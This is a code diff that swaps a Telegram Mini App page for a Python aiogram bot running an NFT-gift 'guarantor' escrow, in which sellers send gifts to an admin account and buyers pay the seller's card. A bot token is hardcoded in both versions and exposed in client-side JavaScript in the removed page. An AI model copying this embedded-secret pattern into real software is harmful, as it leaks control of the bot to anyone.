@@ -1,233 +1,146 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Escrow Service</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        :root {
-            --bg-color: #0b0c10; --card-bg: #13151b; --card-border: #212531;
-            --accent: #2ea6ff; --text-main: #ffffff; --text-muted: #8b94a5;
-            --success: #22c55e; --warning: #f59e0b; --danger: #ef4444;
-        }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, sans-serif; }
-        body { background-color: var(--bg-color); color: var(--text-main); padding: 16px; display: flex; flex-direction: column; gap: 16px; min-height: 100vh; }
-        .header { text-align: center; padding: 10px 0; }
-        .header h1 { font-size: 20px; font-weight: 800; }
-        .card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 20px; padding: 20px; display: flex; flex-direction: column; gap: 16px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
-        .card-title { font-size: 17px; font-weight: 700; display: flex; justify-content: space-between; align-items: center; }
-        .form-group { display: flex; flex-direction: column; gap: 6px; }
-        .form-group label { font-size: 11px; color: var(--text-muted); font-weight: 600; text-transform: uppercase; }
-        .form-control { background: #0b0c10; border: 1px solid var(--card-border); border-radius: 12px; padding: 12px; color: #fff; font-size: 14px; outline: none; width: 100%; }
-        .action-box { background: rgba(46, 166, 255, 0.05); border: 1px dashed var(--accent); border-radius: 14px; padding: 14px; text-align: center; cursor: pointer; }
-        .action-box .value { font-size: 14px; font-weight: 700; color: var(--accent); margin-top: 4px; word-break: break-all; }
-        .instruction { font-size: 13px; color: var(--text-muted); line-height: 1.4; }
-        .instruction b { color: var(--text-main); }
-        .btn { width: 100%; padding: 14px; border: none; border-radius: 14px; font-size: 15px; font-weight: 700; cursor: pointer; background: var(--accent); color: #fff; text-align: center; margin-top: 8px; }
-        .btn-success { background: var(--success); color: #0b0c10; }
-        .btn-danger { background: transparent; border: 1px solid var(--danger); color: var(--danger); }
-        .info-row { display: flex; justify-content: space-between; font-size: 13px; }
-        .info-row .label { color: var(--text-muted); } .info-row .val { font-weight: 600; }
-        hr { border: 0; border-top: 1px solid var(--card-border); }
-        .badge { padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; }
-        .badge.warning { background: rgba(245, 158, 11, 0.15); color: var(--warning); }
-        .hidden { display: none !important; }
-        .text-center { text-align: center; }
-    </style>
-</head>
-<body>
+import json
+import logging
+from aiogram import Bot, Dispatcher, F, types
+from aiogram.filters import CommandStart
+from aiogram.types import WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
 
-    <div class="header">
-        <h1>🛡 Гарант Сервис</h1>
-        <p>Безопасные сделки с NFT подарками</p>
-    </div>
+TOKEN = "8987632200:AAG2bS9DJy9sGzuUdAZ-kiuZZB0jNXVeo3Y"
+GROUP_ID = -1003589174040
+WEBAPP_URL = "https://dimaserezhkin14-hash.github.io/saytyra/"
 
-    <!-- ИНТЕРФЕЙС ПРОДАВЦА -->
-    <div id="sellerView">
-        <div id="sellerStep1" class="card">
-            <div class="card-title">📦 Создание сделки</div>
-            <div class="form-group"><label>Название подарка</label><input type="text" class="form-control" id="giftName" placeholder="Владосик Мишка"></div>
-            <div class="form-group"><label>Сумма к оплате (в рублях)</label><input type="number" class="form-control" id="giftPrice" placeholder="1500"></div>
-            <hr>
-            <div style="font-size: 13px; font-weight: 700; color: var(--accent);">Реквизиты для получения денег</div>
-            <div class="form-group"><label>Банк</label><input type="text" class="form-control" id="payBank" placeholder="Сбер / Т-Банк"></div>
-            <div class="form-group"><label>Карта / Телефон</label><input type="text" class="form-control" id="payCard" placeholder="+7 999 000-00-00"></div>
-            <div class="form-group"><label>Комментарий (по желанию)</label><input type="text" class="form-control" id="payComment" placeholder="За подарок"></div>
-            <button class="btn" onclick="createDeal()">Сгенерировать сделку</button>
-        </div>
+logging.basicConfig(level=logging.INFO)
+bot = Bot(token=TOKEN)
+dp = Dispatcher()
 
-        <div id="sellerStep2" class="card hidden">
-            <div class="card-title">🔗 Персональная ссылка</div>
-            <div class="instruction">Скопируйте и отправьте покупателю:</div>
-            <div class="action-box" onclick="copyText(document.getElementById('personalDealLink').textContent)">
-                <div style="font-size: 11px; color: var(--text-muted);">Нажмите для копирования:</div>
-                <div class="value" id="personalDealLink"></div>
-            </div>
-            <button class="btn" onclick="sellerGoToDeposit()">Перейти к отправке подарка</button>
-        </div>
+# Временное хранилище сделок в памяти бота
+DEALS_STORAGE = {}
 
-        <div id="sellerStep3" class="card hidden">
-            <div class="card-title"><span>📤 Отправка гаранту</span><span class="badge warning">Ожидание</span></div>
-            <div class="instruction">1. Отправьте подарок и 2 мишки на аккаунт:</div>
-            <div class="action-box" onclick="copyText('@GuarantRelayer')">
-                <div style="font-size: 11px; color: var(--text-muted);">Нажмите для копирования:</div>
-                <div class="value">@GuarantRelayer</div>
-            </div>
-            <div class="instruction">2. После отправки нажмите кнопку. Администратор проверит перевод в группе.</div>
-            <button class="btn btn-success" onclick="sellerDoneDeposit()">✅ Я отправил активы</button>
-            <button class="btn btn-danger" onclick="openSupport()">🆘 Поддержка (Спор)</button>
-        </div>
-
-        <!-- ЭКРАН ОЖИДАНИЯ ПРОДАВЦА (ИНТЕРФЕЙС НЕ ПРОПАДАЕТ) -->
-        <div id="sellerStep4" class="card hidden text-center">
-            <div class="card-title"><span>⏳ Ожидание оплаты</span><span class="badge warning">Проверка админа</span></div>
-            <div class="instruction">Вы отправили активы. Ждем, пока администратор проверит их в группе и подтвердит сделку для покупателя.</div>
-            <button class="btn btn-danger" onclick="openSupport()">🆘 Поддержка (Спор)</button>
-        </div>
-    </div>
-
-    <!-- ИНТЕРФЕЙС ПОКУПАТЕЛЯ (ОТКРЫВАЕТСЯ ПО ССЫЛКЕ ОПЛАТЫ) -->
-    <div id="buyerView" class="card hidden">
-        <div class="card-title">
-            <span>💳 Оплата сделки</span>
-            <span class="badge warning">Активы у гаранта</span>
-        </div>
-        <div class="info-row"><span class="label">Подарок:</span><span class="val" id="bGiftName">—</span></div>
-        <div class="info-row"><span class="label">Сумма:</span><span class="val" style="color: var(--success);" id="bGiftPrice">0 ₽</span></div>
-        <hr>
-        <div class="instruction">✅ Администратор подтвердил получение активов. Переведите деньги на реквизиты продавца:</div>
-        <div class="action-box">
-            <div style="font-size: 12px; color: var(--text-muted);" id="rBank">Банк: —</div>
-            <div class="value" id="rCard" style="font-size: 16px; user-select: text;">—</div>
-            <div style="font-size: 12px; color: var(--text-muted); margin-top: 4px;" id="rComment">Комментарий: —</div>
-        </div>
-        <button class="btn btn-success" onclick="buyerPaidAction()">✅ Я перевел деньги</button>
-        <button class="btn btn-danger" onclick="openSupport()">🆘 Поддержка (Спор)</button>
-    </div>
-
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
-
-        const BOT_TOKEN = "8987632200:AAG2bS9DJy9sGzuUdAZ-kiuZZB0jNXVeo3Y";
-        const GROUP_ID = -1003589174040;
-
-        let globalGift = "", globalPrice = "", globalBank = "", globalCard = "", globalComment = "";
-
-        async function sendTelegramMessage(text, replyMarkup = null) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            try {
-                const body = { chat_id: GROUP_ID, text: text, parse_mode: "HTML" };
-                if (replyMarkup) body.reply_markup = replyMarkup;
-                await fetch(url, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(body)
-                });
-            } catch (e) { console.error(e); }
-        }
-
-        window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const payParam = urlParams.get('pay_data');
-            const startParam = tg.initDataUnsafe?.start_param || urlParams.get('deal_data');
-
-            if (payParam) {
-                // Покупатель зашел по кнопке оплаты от админа
-                document.getElementById('sellerView').classList.add('hidden');
-                document.getElementById('buyerView').classList.remove('hidden');
-                try {
-                    const data = JSON.parse(decodeURIComponent(payParam));
-                    document.getElementById('bGiftName').textContent = data.gift;
-                    document.getElementById('bGiftPrice').textContent = data.price + ' ₽';
-                    document.getElementById('rBank').textContent = 'Банк: ' + data.bank;
-                    document.getElementById('rCard').textContent = data.card;
-                    document.getElementById('rComment').textContent = 'Комментарий: ' + (data.comment || 'Нет');
-                } catch(e) { console.error(e); }
-            } else if (startParam) {
-                // Если покупатель открыл по общей ссылке старта
-                try {
-                    const data = JSON.parse(decodeURIComponent(startParam));
-                    globalGift = data.gift; globalPrice = data.price; 
-                    globalBank = data.bank; globalCard = data.card; globalComment = data.comment;
-                } catch(e) {}
-            }
-        };
-
-        async function createDeal() {
-            globalGift = document.getElementById('giftName').value.trim();
-            globalPrice = document.getElementById('giftPrice').value.trim();
-            globalBank = document.getElementById('payBank').value.trim();
-            globalCard = document.getElementById('payCard').value.trim();
-            globalComment = document.getElementById('payComment').value.trim();
-
-            if (!globalGift || !globalPrice || !globalBank || !globalCard) {
-                tg.showAlert("Заполните название, сумму и реквизиты!");
-                return;
-            }
-
-            const dealPayload = { gift: globalGift, price: globalPrice, bank: globalBank, card: globalCard, comment: globalComment };
-            const encodedPayload = encodeURIComponent(JSON.stringify(dealPayload));
-            const personalLink = `https://t.me/GuarantMiniApp_bot?start=deal_${encodedPayload}`;
-
-            document.getElementById('personalDealLink').textContent = personalLink;
-
-            document.getElementById('sellerStep1').classList.add('hidden');
-            document.getElementById('sellerStep2').classList.remove('hidden');
-        }
-
-        function sellerGoToDeposit() {
-            document.getElementById('sellerStep2').classList.add('hidden');
-            document.getElementById('sellerStep3').classList.remove('hidden');
-        }
-
-        async function sellerDoneDeposit() {
-            const user = tg.initDataUnsafe?.user;
-            const username = user ? (user.username ? `@${user.username}` : user.first_name) : "Продавец";
-            const userId = user ? user.id : "неизвестно";
-
-            const text = (
-                `📤 <b>ПРОДАВЕЦ ОТПРАВИЛ АКТИВЫ НА ПРОВЕРКУ!</b>\n\n` +
-                `👤 <b>Продавец:</b> ${username} (ID: <code>${userId}</code>)\n` +
-                `🎁 <b>Подарок:</b> ${globalGift}\n` +
-                `💰 <b>Сумма:</b> ${globalPrice} ₽\n\n` +
-                `👉 Нажмите кнопку ниже, чтобы подтвердить получение подарка и 2 мишек, после чего покупателю откроются реквизиты:`
-            );
-
-            // Кнопка для тебя (админа) в группе с зашитыми данными сделки
-            const callbackData = `admin_confirm_|${globalGift}|${globalPrice}|${globalBank}|${globalCard}|${globalComment}`;
-            const replyMarkup = {
-                inline_keyboard: [[
-                    { text: "✅ Подтвердить получение активов", callback_data: callbackData }
+@dp.message(CommandStart())
+async def cmd_start(message: types.Message):
+    args = message.text.split()
+    
+    if len(args) > 1 and args[1].startswith("deal_"):
+        deal_id = args[1].replace("deal_", "")
+        await message.answer(
+            f"🛡 <b>Безопасная сделка #{deal_id}</b>\n\n"
+            f"Нажмите кнопку ниже, чтобы открыть статус сделки:",
+            reply_markup=InlineKeyboardMarkup(
+                inline_keyboard=[[
+                    InlineKeyboardButton(
+                        text="📦 Открыть сделку", 
+                        web_app=WebAppInfo(url=f"{WEBAPP_URL}?deal_id={deal_id}")
+                    )
                 ]]
-            };
+            ),
+            parse_mode="HTML"
+        )
+    else:
+        await message.answer(
+            "🛡 <b>Гарант Сервис</b>\n\nСоздайте безопасную сделку:",
+            reply_markup=InlineKeyboardMarkup(
+                inline_keyboard=[[
+                    InlineKeyboardButton(
+                        text="🚀 Создать сделку", 
+                        web_app=WebAppInfo(url=WEBAPP_URL)
+                    )
+                ]]
+            ),
+            parse_mode="HTML"
+        )
 
-            await sendTelegramMessage(text, replyMarkup);
+# Обработка создания сделки или уведомлений от Mini App напрямую через бота
+@dp.message(F.web_app_data)
+async def handle_webapp_data(message: types.Message):
+    try:
+        data = json.loads(message.web_app_data.data)
+        action = data.get("action")
+        deal_id = data.get("deal_id")
+        user = message.from_user
+        username = f"@{user.username}" if user.username else user.full_name
 
-            // У продавца интерфейс НЕ пропадает, открывается экран ожидания с кнопкой поддержки
-            document.getElementById('sellerStep3').classList.add('hidden');
-            document.getElementById('sellerStep4').classList.remove('hidden');
-            tg.showAlert("Активы отправлены! Ожидайте подтверждения администратора.");
-        }
+        if action == "create_deal":
+            DEALS_STORAGE[str(deal_id)] = {
+                "gift": data.get("gift"),
+                "price": data.get("price"),
+                "bank": data.get("bank"),
+                "card": data.get("card"),
+                "comment": data.get("comment"),
+                "seller_name": username,
+                "seller_id": user.id,
+                "status": "waiting_deposit"
+            }
 
-        async function openSupport() {
-            const user = tg.initDataUnsafe?.user;
-            const username = user ? (user.username ? `@${user.username}` : user.first_name) : "Пользователь";
-            await sendTelegramMessage(`🚨 <b>ВЫЗОВ ПОДДЕРЖКИ (СПОР)!</b>\nПользователь: ${username} открыл спор по сделке с подарком: ${globalGift || 'Не указан'}`);
-            tg.showAlert("Запрос отправлен в поддержку!");
-        }
+            text = (
+                f"📦 <b>НОВАЯ СДЕЛКА #{deal_id}</b>\n\n"
+                f"👤 <b>Продавец:</b> {username} (ID: <code>{user.id}</code>)\n"
+                f"🎁 <b>Подарок:</b> {data.get('gift')}\n"
+                f"💰 <b>Сумма:</b> {data.get('price')} ₽\n\n"
+                f"🔗 Ссылка для покупателя создана."
+            )
+            await bot.send_message(GROUP_ID, text, parse_mode="HTML")
 
-        function buyerPaidAction() {
-            tg.showAlert("Вы подтвердили перевод! Ожидайте выдачи подарка от гаранта.");
-        }
+        elif action == "deposit_done":
+            if str(deal_id) in DEALS_STORAGE:
+                DEALS_STORAGE[str(deal_id)]["status"] = "waiting_admin_confirm"
 
-        function copyText(text) {
-            navigator.clipboard.writeText(text).then(() => {
-                if (tg.showPopup) tg.showPopup({ title: "Скопировано! ✅", message: text, buttons: [{type: "ok"}] });
-                else alert("Скопировано: " + text);
-            });
-        }
-    </script>
-</body>
-</html>
+            text = (
+                f"📤 <b>ПРОДАВЕЦ ОТПРАВИЛ АКТИВЫ НА ПРОВЕРКУ!</b>\n\n"
+                f"🆔 <b>Сделка:</b> #{deal_id}\n"
+                f"👤 <b>Продавец:</b> {username}\n"
+                f"🎁 <b>Подарок:</b> {data.get('gift')}\n\n"
+                f"👉 Нажмите кнопку ниже, чтобы подтвердить получение актива:"
+            )
+            await bot.send_message(
+                GROUP_ID, 
+                text, 
+                reply_markup=InlineKeyboardMarkup(
+                    inline_keyboard=[[
+                        InlineKeyboardButton(
+                            text="✅ Подтвердить получение активов", 
+                            callback_data=f"confirm_{deal_id}"
+                        )
+                    ]]
+                ),
+                parse_mode="HTML"
+            )
+
+        elif action == "buyer_paid":
+            text = (
+                f"💳 <b>ПОКУПАТЕЛЬ ПОДТВЕРДИЛ ОПЛАТУ!</b>\n\n"
+                f"🆔 <b>Сделка:</b> #{deal_id}\n"
+                f"👤 <b>Покупатель:</b> {username}\n\n"
+                f"👉 Проверьте поступление денег на карту и выдайте подарок покупателю!"
+            )
+            await bot.send_message(GROUP_ID, text, parse_mode="HTML")
+
+        elif action == "support":
+            text = f"🚨 <b>ВЫЗОВ ПОДДЕРЖКИ (СПОР)!</b>\n\n🆔 Сделка: #{deal_id}\n👤 Пользователь: {username}"
+            await bot.send_message(GROUP_ID, text, parse_mode="HTML")
+
+    except Exception as e:
+        print(f"Error parsing web_app_data: {e}")
+
+# Админ в группе нажимает кнопку подтверждения
+@dp.callback_query(F.data.startswith("confirm_"))
+async def admin_confirm(callback: types.CallbackQuery):
+    deal_id = callback.data.replace("confirm_", "")
+    deal = DEALS_STORAGE.get(str(deal_id))
+
+    if deal:
+        deal["status"] = "deposit_confirmed"
+        text = (
+            f"✅ <b>АКТИВЫ ПОЛУЧЕНЫ ГАРАНТОМ! Сделка #{deal_id}</b>\n\n"
+            f"🎁 <b>Подарок:</b> {deal['gift']}\n"
+            f"💰 <b>Сумма:</b> {deal['price']} ₽\n\n"
+            f"💳 Реквизиты переданы покупателю через Mini App."
+        )
+        await callback.message.edit_text(text, parse_mode="HTML")
+        await callback.answer("Успешно подтверждено!")
+    else:
+        await callback.answer("Сделка не найдена в памяти бота!", show_alert=True)
+
+if __name__ == "__main__":
+    import asyncio
+    print("Бот запущен...")
+    asyncio.run(dp.start_polling(bot))
+    
